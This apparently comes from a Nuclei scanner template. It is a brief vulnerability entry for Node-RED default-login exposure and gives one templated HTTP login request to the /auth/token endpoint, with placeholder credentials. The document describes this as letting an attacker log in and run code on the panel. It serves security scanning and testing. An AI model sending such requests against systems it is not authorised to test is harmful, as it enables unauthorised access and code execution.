# Vulnerability: Node-Red - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`nodered-default-login.yaml`)

## Description
Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /auth/token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

client_id=node-red-editor&grant_type=password&scope=&username={{username}}&password={{password}}
```

